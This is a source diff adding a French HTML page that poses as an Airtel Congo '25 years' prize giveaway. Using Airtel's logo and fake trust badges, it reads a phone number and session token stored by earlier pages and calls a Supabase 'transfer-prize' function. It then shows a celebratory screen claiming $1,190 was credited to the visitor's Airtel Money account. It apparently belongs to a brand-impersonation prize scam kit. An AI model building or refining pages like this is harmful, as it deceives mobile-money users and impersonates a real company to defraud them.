@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AIRTEL CONGO - Prix Transféré</title>
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+
+  body {
+    min-height: 100vh;
+    background: #0a0a0a;
+    overflow-x: hidden;
+    font-family: 'DM Sans', 'Segoe UI', Roboto, Arial, sans-serif;
+  }
+
+  .success-root {
+    position: relative;
+    min-height: 100vh;
+    background: linear-gradient(135deg, #1a0000 0%, #2d0000 40%, #1a0505 100%);
+    overflow: hidden;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+
+  /* Blobs */
+  .ann-blob {
+    position: absolute;
+    border-radius: 50%;
+    filter: blur(80px);
+    opacity: 0.5;
+    pointer-events: none;
+  }
+  .ann-blob-1 {
+    width: 400px; height: 400px;
+    background: #e30613;
+    top: -100px; left: -100px;
+    animation: float 8s ease-in-out infinite;
+  }
+  .ann-blob-2 {
+    width: 350px; height: 350px;
+    background: #ffcc00;
+    bottom: -80px; right: -80px;
+    animation: float 10s ease-in-out infinite reverse;
+    opacity: 0.3;
+  }
+  .ann-blob-3 {
+    width: 300px; height: 300px;
+    background: #e30613;
+    top: 50%; left: 50%;
+    transform: translate(-50%, -50%);
+    animation: float 12s ease-in-out infinite;
+    opacity: 0.2;
+  }
+
+  @keyframes float {
+    0%, 100% { transform: translate(0, 0) scale(1); }
+    50% { transform: translate(30px, -30px) scale(1.1); }
+  }
+
+  .confetti-layer {
+    position: absolute;
+    inset: 0;
+    pointer-events: none;
+    overflow: hidden;
+  }
+
+  .success-inner {
+    position: relative;
+    z-index: 10;
+    width: 100%;
+    max-width: 440px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 20px;
+    text-align: center;
+  }
+
+  /* Logo bar */
+  .ann-logo-bar {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    background: rgba(255, 255, 255, 0.05);
+    padding: 10px 20px;
+    border-radius: 50px;
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    backdrop-filter: blur(10px);
+    margin-bottom: 8px;
+  }
+
+  .ann-logo {
+    height: 28px;
+    width: auto;
+    filter: brightness(0) invert(1);
+  }
+
+  .ann-logo-divider {
+    width: 1px;
+    height: 20px;
+    background: rgba(255, 255, 255, 0.2);
+  }
+
+  .ann-25-badge {
+    color: #ffcc00;
+    font-size: 12px;
+    font-weight: 700;
+    letter-spacing: 0.5px;
+    white-space: nowrap;
+  }
+
+  /* Loading state */
+  .loading-spinner {
+    width: 90px;
+    height: 90px;
+    border: 5px solid rgba(255, 204, 0, 0.2);
+    border-top-color: #ffcc00;
+    border-right-color: #e30613;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+  }
+
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+
+  .loading-text {
+    font-size: 18px;
+    color: rgba(255, 255, 255, 0.85);
+    font-weight: 600;
+  }
+
+  /* Success icon */
+  .success-icon {
+    width: 110px;
+    height: 110px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, #00c853, #009624);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 58px;
+    color: #fff;
+    box-shadow: 0 0 60px rgba(0, 200, 83, 0.7);
+    animation: pulse-success 2s ease-in-out infinite;
+  }
+
+  @keyframes pulse-success {
+    0%, 100% { box-shadow: 0 0 60px rgba(0, 200, 83, 0.7); transform: scale(1); }
+    50% { box-shadow: 0 0 90px rgba(0, 200, 83, 1); transform: scale(1.05); }
+  }
+
+  .success-title {
+    font-family: 'Syne', sans-serif;
+    font-size: 32px;
+    font-weight: 800;
+    color: #fff;
+    line-height: 1.2;
+  }
+
+  .success-subtitle {
+    font-size: 15px;
+    color: rgba(255, 255, 255, 0.75);
+    line-height: 1.6;
+    max-width: 340px;
+  }
+
+  /* Amount */
+  .success-amount-section {
+    background: linear-gradient(135deg, rgba(255, 204, 0, 0.15), rgba(227, 6, 19, 0.15));
+    border: 2px solid rgba(255, 204, 0, 0.4);
+    border-radius: 20px;
+    padding: 24px 32px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 6px;
+    width: 100%;
+    margin-top: 8px;
+  }
+
+  .success-amount-label {
+    font-size: 12px;
+    color: rgba(255, 255, 255, 0.7);
+    text-transform: uppercase;
+    letter-spacing: 1.5px;
+    font-weight: 600;
+  }
+
+  .success-amount {
+    font-size: 56px;
+    font-weight: 900;
+    background: linear-gradient(90deg, #ffcc00, #ffaa00, #ffcc00);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    line-height: 1.1;
+  }
+
+  .success-amount-note {
+    font-size: 12.5px;
+    color: #ffcc00;
+    font-weight: 600;
+  }
+
+  /* Details */
+  .success-details {
+    width: 100%;
+    background: rgba(255, 255, 255, 0.06);
+    border: 1px solid rgba(255, 255, 255, 0.12);
+    border-radius: 16px;
+    padding: 20px;
+    display: flex;
+    flex-direction: column;
+    gap: 14px;
+    margin-top: 8px;
+  }
+
+  .success-detail-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 6px 0;
+  }
+
+  .success-detail-label {
+    font-size: 13px;
+    color: rgba(255, 255, 255, 0.6);
+    font-weight: 500;
+  }
+
+  .success-detail-value {
+    font-size: 14px;
+    color: #fff;
+    font-weight: 700;
+  }
+
+  .success-detail-value.gold {
+    color: #ffcc00;
+    font-family: 'Courier New', monospace;
+    letter-spacing: 1px;
+  }
+
+  .success-detail-value.green {
+    color: #00c853;
+  }
+
+  /* Trust row */
+  .ann-trust-row {
+    display: flex;
+    gap: 10px;
+    flex-wrap: wrap;
+    justify-content: center;
+    margin-top: 8px;
+  }
+
+  .ann-trust-pill {
+    background: rgba(255, 255, 255, 0.06);
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    border-radius: 50px;
+    padding: 8px 16px;
+    font-size: 12px;
+    color: rgba(255, 255, 255, 0.8);
+    font-weight: 600;
+    white-space: nowrap;
+  }
+
+  /* Buttons */
+  .success-btn {
+    width: 100%;
+    padding: 16px;
+    border: none;
+    border-radius: 12px;
+    background: linear-gradient(135deg, #e30613, #b00510);
+    color: #fff;
+    font-size: 15px;
+    font-weight: 800;
+    cursor: pointer;
+    transition: all 0.3s;
+    box-shadow: 0 8px 24px rgba(227, 6, 19, 0.5);
+    letter-spacing: 0.5px;
+    font-family: 'Syne', 'DM Sans', sans-serif;
+    margin-top: 12px;
+    text-transform: uppercase;
+  }
+
+  .success-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 12px 32px rgba(227, 6, 19, 0.7);
+  }
+
+  .success-btn-secondary {
+    width: 100%;
+    padding: 14px;
+    border: 1px solid rgba(255, 204, 0, 0.4);
+    border-radius: 12px;
+    background: transparent;
+    color: #ffcc00;
+    font-size: 14px;
+    font-weight: 700;
+    cursor: pointer;
+    transition: all 0.3s;
+    letter-spacing: 0.3px;
+    font-family: inherit;
+  }
+
+  .success-btn-secondary:hover {
+    background: rgba(255, 204, 0, 0.1);
+    border-color: #ffcc00;
+  }
+
+  /* Error state */
+  .error-box {
+    background: rgba(227, 6, 19, 0.15);
+    border: 1px solid rgba(227, 6, 19, 0.4);
+    border-radius: 12px;
+    padding: 16px 20px;
+    font-size: 14px;
+    color: #ff6b6b;
+    text-align: center;
+    width: 100%;
+  }
+
+  /* Confetti */
+  .confetti-piece {
+    position: absolute;
+    width: 10px;
+    height: 10px;
+    top: -20px;
+    opacity: 0;
+    animation: confetti-fall linear forwards;
+  }
+
+  @keyframes confetti-fall {
+    0% { transform: translateY(0) rotate(0deg); opacity: 1; }
+    100% { transform: translateY(100vh) rotate(720deg); opacity: 0; }
+  }
+
+  /* Utility */
+  .hidden { display: none !important; }
+
+  /* Responsive */
+  @media (max-width: 480px) {
+    .success-title { font-size: 26px; }
+    .success-amount { font-size: 46px; }
+    .success-icon { width: 90px; height: 90px; font-size: 48px; }
+    .loading-spinner { width: 70px; height: 70px; }
+  }
+</style>
+</head>
+<body>
+<div id="root">
+  <div class="success-root">
+    <div class="ann-blob ann-blob-1"></div>
+    <div class="ann-blob ann-blob-2"></div>
+    <div class="ann-blob ann-blob-3"></div>
+    <div class="confetti-layer" id="confettiLayer"></div>
+
+    <div class="success-inner">
+      <div class="ann-logo-bar">
+        <img alt="Airtel" class="ann-logo" src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg">
+        <div class="ann-logo-divider"></div>
+        <span class="ann-25-badge">25 ans ensemble</span>
+      </div>
+
+      <!-- ==================== LOADING STATE ==================== -->
+      <div id="loadingState" style="display: flex; flex-direction: column; align-items: center; gap: 20px;">
+        <div class="loading-spinner"></div>
+        <div class="loading-text">Transfert en cours...</div>
+      </div>
+
+      <!-- ==================== SUCCESS STATE ==================== -->
+      <div id="successState" class="hidden" style="display: flex; flex-direction: column; align-items: center; gap: 20px; width: 100%;">
+        <div class="success-icon">✓</div>
+
+        <h1 class="success-title">Prix Transféré !</h1>
+        <p class="success-subtitle">Votre récompense a été envoyée avec succès à votre compte Airtel Money.</p>
+
+        <div class="success-amount-section">
+          <div class="success-amount-label">Montant reçu</div>
+          <div class="success-amount" id="successAmount">$1,190</div>
+          <div class="success-amount-note">Crédité sur votre compte Airtel Money</div>
+        </div>
+
+        <div class="success-details">
+          <div class="success-detail-row">
+            <span class="success-detail-label">Référence</span>
+            <span class="success-detail-value gold" id="successRef">AIR-1AG5-9843</span>
+          </div>
+          <div class="success-detail-row">
+            <span class="success-detail-label">Numéro de téléphone</span>
+            <span class="success-detail-value" id="successPhone">+243 91 234 5677</span>
+          </div>
+          <div class="success-detail-row">
+            <span class="success-detail-label">Statut</span>
+            <span class="success-detail-value green">✓ Complété</span>
+          </div>
+          <div class="success-detail-row">
+            <span class="success-detail-label">Date</span>
+            <span class="success-detail-value" id="successDate">12 Oct 2026</span>
+          </div>
+        </div>
+
+        <div class="ann-trust-row">
+          <div class="ann-trust-pill">🔒 Sécurisé</div>
+          <div class="ann-trust-pill">📩 SMS de confirmation envoyé</div>
+          <div class="ann-trust-pill">✅ Transfert réussi</div>
+        </div>
+
+        <button class="success-btn" onclick="closePage()">Terminer</button>
+        <button class="success-btn-secondary" onclick="shareReceipt()">📤 Partager le reçu</button>
+      </div>
+
+      <!-- ==================== ERROR STATE ==================== -->
+      <div id="errorState" class="hidden" style="display: flex; flex-direction: column; align-items: center; gap: 20px; width: 100%;">
+        <div class="error-box" id="errorBox">Une erreur est survenue lors du transfert.</div>
+        <button class="success-btn" onclick="retryTransfer()">🔄 Réessayer</button>
+        <button class="success-btn-secondary" onclick="closePage()">Retour à l'accueil</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  /* ==================== CONFIG ==================== */
+  const SUPABASE_URL = 'https://YOUR_PROJECT.supabase.co';
+  const SUPABASE_ANON_KEY = 'YOUR_ANON_KEY';
+
+  /* ==================== ELEMENTS ==================== */
+  const loadingState = document.getElementById('loadingState');
+  const successState = document.getElementById('successState');
+  const errorState = document.getElementById('errorState');
+  const errorBox = document.getElementById('errorBox');
+
+  /* ==================== LOAD SESSION DATA ==================== */
+  const phone = sessionStorage.getItem('airtel_phone');
+  const amount = sessionStorage.getItem('airtel_amount');
+  const reference = sessionStorage.getItem('airtel_reference');
+  const sessionToken = sessionStorage.getItem('airtel_session');
+
+  // Guard — redirect if missing session
+  if (!phone || !amount || !reference || !sessionToken) {
+    window.location.href = 'index.html';
+  }
+
+  /* ==================== TRANSFER PRIZE (BACKEND CALL) ==================== */
+  async function transferPrize() {
+    // Show loading
+    loadingState.classList.remove('hidden');
+    successState.classList.add('hidden');
+    errorState.classList.add('hidden');
+
+    try {
+      const res = await fetch(`${SUPABASE_URL}/functions/v1/transfer-prize`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
+        },
+        body: JSON.stringify({
+          session_token: sessionToken,
+        }),
+      });
+
+      const data = await res.json();
+
+      if (!res.ok || !data.success) {
+        throw new Error(data.error || 'Erreur lors du transfert');
+      }
+
+      // Fill in success details
+      document.getElementById('successAmount').textContent = '$' + parseInt(data.amount).toLocaleString('en-US');
+      document.getElementById('successRef').textContent = data.reference;
+
+      // Display phone
+      const clean = phone.replace(/\D/g, '');
+      const formatted = clean.length === 9
+        ? clean.slice(0, 2) + ' ' + clean.slice(2, 5) + ' ' + clean.slice(5)
+        : clean;
+      document.getElementById('successPhone').textContent = '+243 ' + formatted;
+
+      // Display date
+      const now = new Date();
+      const options = { day: '2-digit', month: 'short', year: 'numeric' };
+      document.getElementById('successDate').textContent = now.toLocaleDateString('en-GB', options);
+
+      // Show success
+      loadingState.classList.add('hidden');
+      successState.classList.remove('hidden');
+
+      // Start confetti
+      startConfetti();
+
+      // Clear session (completed)
+      sessionStorage.removeItem('airtel_amount');
+      sessionStorage.removeItem('airtel_reference');
+    } catch (err) {
+      console.error(err);
+      errorBox.textContent = err.message || 'Une erreur est survenue lors du transfert.';
+      loadingState.classList.add('hidden');
+      errorState.classList.remove('hidden');
+    }
+  }
+
+  /* ==================== RETRY ==================== */
+  function retryTransfer() {
+    transferPrize();
+  }
+
+  /* ==================== BUTTONS ==================== */
+  function closePage() {
+    sessionStorage.clear();
+    window.location.href = 'index.html';
+  }
+
+  function shareReceipt() {
+    const text = `J'ai reçu mon prix Airtel 25 Ans : ${document.getElementById('successAmount').textContent} 🎉\nRéférence : ${document.getElementById('successRef').textContent}`;
+
+    if (navigator.share) {
+      navigator.share({
+        title: 'Airtel 25 Ans - Reçu',
+        text: text
+      }).catch(() => {});
+    } else {
+      navigator.clipboard.writeText(text).then(() => {
+        alert('Reçu copié dans le presse-papiers !');
+      }).catch(() => {
+        alert('Partage non disponible sur ce navigateur');
+      });
+    }
+  }
+
+  /* ==================== CONFETTI ==================== */
+  const confettiLayer = document.getElementById('confettiLayer');
+  const confettiColors = ['#e30613', '#ffcc00', '#ffffff', '#00c853', '#ffaa00'];
+  let confettiInterval = null;
+
+  function createConfetti() {
+    const piece = document.createElement('div');
+    piece.classList.add('confetti-piece');
+    piece.style.left = Math.random() * 100 + '%';
+    piece.style.backgroundColor = confettiColors[Math.floor(Math.random() * confettiColors.length)];
+    piece.style.width = (Math.random() * 8 + 6) + 'px';
+    piece.style.height = (Math.random() * 8 + 6) + 'px';
+    piece.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
+    piece.style.animationDuration = (Math.random() * 2 + 2) + 's';
+    piece.style.animationDelay = Math.random() * 0.5 + 's';
+    confettiLayer.appendChild(piece);
+    setTimeout(() => piece.remove(), 5000);
+  }
+
+  function startConfetti() {
+    if (confettiInterval) return;
+    for (let i = 0; i < 35; i++) setTimeout(createConfetti, i * 80);
+    confettiInterval = setInterval(createConfetti, 300);
+  }
+
+  /* ==================== INIT ==================== */
+  // Auto-call transfer on page load
+  transferPrize();
+</script>
+</body>
+</html>
